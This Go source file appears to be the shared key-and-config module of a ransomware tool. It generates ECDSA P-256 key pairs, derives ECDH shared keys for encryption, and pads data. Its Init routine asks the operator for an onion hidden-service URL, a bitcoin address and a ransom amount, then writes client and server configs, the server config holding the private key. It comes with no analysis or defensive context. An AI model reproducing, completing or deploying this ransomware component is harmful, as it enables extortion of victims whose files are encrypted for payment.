package main

import (
	"crypto/aes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/jcelliott/lumber"
	"math/big"
	"os"
	"time"
)

const (
	RSW_PREFIX         string = "_rsw_"
	RSW_CC_FILE_PREFIX string = RSW_PREFIX + "cc_"
	RSW_SC_FILE        string = RSW_PREFIX + "sc"
	RSW_WELCOME        string = "_rsww_.html"
)

var (
	serverPrivateKey *ecdsa.PrivateKey
	log              *lumber.ConsoleLogger
)

type CipheredFileInfo struct {
	PubKey    *ecdsa.PublicKey
	HeaderLen int
}

type PubKey struct {
	X string `json:"X"`
	Y string `json:"Y"`
}

type CommonConfig struct {
	PubKey     PubKey `json:"PubKey"`
	Amount     string `json:"amount"`
	BtcAddress string `json:"btcaddress"`
	OnionUrl   string `json:"onionurl"`
}

type ClientConfig struct {
	CommonConfig
}

type ServerConfig struct {
	CommonConfig
	PrivateKey string `json:"privateKey"`
}

func GetServPubKey(pubKeyConfig PubKey) *ecdsa.PublicKey {
	xBytes, _ := hex.DecodeString(pubKeyConfig.X)
	x := new(big.Int).SetBytes(xBytes)
	yBytes, _ := hex.DecodeString(pubKeyConfig.Y)
	y := new(big.Int).SetBytes(yBytes)
	pubkeyCurve := elliptic.P256() //see http://golang.org/pkg/crypto/elliptic/#P256
	pubKey := new(ecdsa.PublicKey)
	pubKey.X = x
	pubKey.Y = y
	pubKey.Curve = pubkeyCurve

	return pubKey
}

func GenSharedKey(privKey *ecdsa.PrivateKey, pubKey *ecdsa.PublicKey) ([]byte, error) {
	curve := elliptic.P256()
	x, _ := curve.ScalarMult(pubKey.X, pubKey.Y, privKey.D.Bytes())
	digest := sha256.Sum256(x.Bytes())
	return digest[:], nil
}

func GetServPrivKey() *ecdsa.PrivateKey {
	return serverPrivateKey
}

func ToHex(num *big.Int) string {

	hexstring := fmt.Sprintf("%x", num)
	if len(hexstring)%2 != 0 {
		hexstring = "0" + hexstring
	}
	return hexstring

}

// Pad applies the PKCS #7 padding scheme on the buffer.
func Pad(in []byte) []byte {
	padding := 16 - (len(in) % 16)
	if padding == 0 {
		padding = 16
	}
	for i := 0; i < padding; i++ {
		in = append(in, byte(padding))
	}
	return in
}

// Unpad strips the PKCS #7 padding on a buffer. If the padding is
// invalid, nil is returned.
func Unpad(in []byte) []byte {
	if len(in) == 0 {
		return nil
	}

	padding := in[len(in)-1]
	if int(padding) > len(in) || padding > aes.BlockSize {
		return nil
	} else if padding == 0 {
		return nil
	}

	for i := len(in) - 1; i > len(in)-int(padding)-1; i-- {
		if in[i] != padding {
			return nil
		}
	}
	return in[:len(in)-int(padding)]
}

func IsSymlink(fi os.FileInfo) bool {
	return (fi.Mode() & os.ModeSymlink) == os.ModeSymlink
}

func LogError(err error) {
	log.Error("%s", err)
}

func GenerateECDSAPrivateKey() (*ecdsa.PrivateKey, error) {
	pubkeyCurve := elliptic.P256()                     //see http://golang.org/pkg/crypto/elliptic/#P256
	return ecdsa.GenerateKey(pubkeyCurve, rand.Reader) // this generates a public & private key pair
}

func SetServerPrivateKey(hexStr string) error {

	serverPrivateKeyBigNum, err := hex.DecodeString(hexStr)
	if err != nil {
		return err
	}

	serverPrivateKey = new(ecdsa.PrivateKey)
	serverPrivateKey.D = new(big.Int).SetBytes(serverPrivateKeyBigNum)
	return nil

}

func ReadFromJson(filePath string, anyobj interface{}) error {
	srcFile, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	dec := json.NewDecoder(srcFile)
	dec.Decode(anyobj)
	return nil
}

func WriteJsonToFile(fileName string, anyobj interface{}) error {
	aFile, err := os.Create(fileName)
	if err != nil {
		return err
	}

	defer aFile.Close()

	enc := json.NewEncoder(aFile)
	return enc.Encode(anyobj)
}

func usage() {
	// Fprintf allows us to print to a specifed file handle or stream
	fmt.Errorf("Usage of %s:\n", os.Args[0])
	// PrintDefaults() may not be exactly what we want, but it could be
	flag.PrintDefaults()
	os.Exit(1)
}

func Init() error {
	var btcAddress, onionUrl, amountStr string
	fmt.Println("Enter the onion hidden service url (ex: ys5b6cgn34rxdjuz.onion:7001) :")
	fmt.Scanf("%s", &onionUrl)
	fmt.Println("Enter your bitcoin address (ex: 1Frvcy9vvBvSGN7HENNBtr4iYjQ9g9GN4E) :")
	fmt.Scanf("%s", &btcAddress)
	fmt.Println("Enter the amount asked (ex: 0.5) :")
	fmt.Scanf("%s", &amountStr)

	serverPrivKey, _ := GenerateECDSAPrivateKey()
	pubKey := PubKey{X: ToHex(serverPrivKey.PublicKey.X), Y: ToHex(serverPrivKey.PublicKey.Y)}
	cc := &ClientConfig{}
	cc.OnionUrl = onionUrl
	cc.Amount = amountStr
	cc.BtcAddress = btcAddress
	cc.PubKey = pubKey

	err := WriteJsonToFile(fmt.Sprintf("%s%d", RSW_CC_FILE_PREFIX, time.Now().Unix()), cc)
	if err != nil {
		return err
	}
	sc := &ServerConfig{}
	sc.PrivateKey = ToHex(serverPrivKey.D)
	sc.OnionUrl = onionUrl
	sc.Amount = amountStr
	sc.BtcAddress = btcAddress
	sc.PubKey = pubKey

	return WriteJsonToFile(RSW_PREFIX+"sc", sc)

}
